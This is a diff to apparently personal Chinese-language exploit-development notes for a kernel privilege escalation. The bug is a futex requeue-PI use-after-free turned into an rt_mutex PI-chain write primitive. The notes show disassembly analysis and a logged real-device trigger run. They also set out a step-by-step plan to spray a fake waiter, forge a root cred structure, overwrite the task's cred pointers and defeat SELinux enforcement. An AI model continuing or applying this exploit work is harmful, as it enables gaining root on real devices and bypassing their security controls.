@@ -76,10 +76,62 @@ PI 链 rb_insert 流程:
 - *(selinux_enforcing) = 栈地址 (非0) → 仍 Enforcing
 - *(task->cred) = 栈地址 (非 init_cred) → 不提权
 
-### 需要确认
-反汇编 rt_mutex_adjust_prio_chain (0xffffffc081052868) 的 rb_insert 部分, 确认:
-1. 写入位置是 write_left+0x08 还是别的
-2. 写入值是 write_pc 还是栈上 waiter 的 pi_tree 地址
+### 已确认 (反汇编 chain_disasm.txt rt_mutex_adjust_prio_chain @ 0xffffffc081052868)
+
+**写入值 = 栈上 waiter 的 pi_tree_entry 地址, 不是 write_pc!**
+
+```asm
+; 行37: x25 = task->pi_blocked_on (UAF 指向栈 waiter)
+ffffffc0810528e0: ldr x25, [x19, #0x938]
+
+; 行159-169: 遍历 PI 树, x11 = 父节点 (write_left), x13 = 0/8 (rb_left/rb_right)
+ffffffc081052ac8: ldr x12, [x1, #0x8]!      ; x12 = root->rb_left = write_left
+ffffffc081052b48: stp x11, xzr, [x25]       ; x25->parent = x11, x25->right = 0
+ffffffc081052b4c: str xzr, [x25, #0x10]     ; x25->left = 0
+ffffffc081052b50: str x25, [x11, x13]       ; *(x11 + x13) = x25  ← 写入 x25 (栈地址)!
+```
+
+x25 = &栈waiter.pi_tree_entry (从 task->pi_blocked_on 取出)。rb_insert 把**栈地址**写到 *(write_left + x13)。
+
+### 写入语义总结
+
+```
+*(target - 8 + x13) = &栈waiter.pi_tree_entry   (x13=0 或 8)
+```
+
+- 若 x13=8: *(target) = 栈地址 (非0)
+- 若 x13=0: *(target-8) = 栈地址
+
+**结论: PI 链写入原语只能写栈地址, 无法直接写 0 或 init_cred。**
+
+### 真机验证 (2026-07-18 STAGE=7, 栈 painting val=0)
+
+```
+CMP_REQUEUE_PI ret=1 errno=0        ← requeue ok, UAF 触发
+waiter WAIT_REQUEUE_PI ret=0 errno=0 ← ret=0 = UAF 已触发!
+stack-painted val=0000000000000000 tgt=ffffffc082315f60  ← 栈 painting 正确 (val=0)
+pselect returned attempt=1-8 calls=40 success=40  ← PI 链触发成功
+enforce AFTER=1 (仍 Enforcing)     ← 写入没成功 (栈地址非0)
+```
+
+### dijun 路线真相 (两次 walk + 伪造 cred)
+
+因为 rb_insert 只能写栈地址, dijun 的 "写 init_cred" 实际是:
+```
+walk#1: *(task->real_cred) = &fake_w0.pi_tree_entry (已知地址, 在 spray 页面)
+walk#2: *(task->cred)      = &fake_w0.pi_tree_entry
+        其中 fake_w0 页面里伪造了 cred 结构 (uid=0, gid=0, cap=全0)
+```
+
+关键是让 task->pi_blocked_on 指向**已知地址的 fake waiter** (spray 页面), 而非栈 waiter。
+这样 x25 = &fake_w0.pi_tree_entry (已知), 且 fake_w0 页面可伪造 cred。
+
+### 下一步 (写原语可控化)
+
+1. 让 pi_blocked_on 指向 fake_w0 (spray 页面): 栈 painting 覆盖栈 waiter 的 pi_blocked_on 字段
+2. fake_w0 页面伪造 cred 结构 (uid/gid/euid/suid/fsuid/egid/sgid/fsgid=0, cap=0)
+3. 两次 walk 写 real_cred/cred 指针槽 = &fake_w0.pi_tree_entry
+4. 验证 task uid=0
 
 ## 4. ashmem SELinux 拦截
 
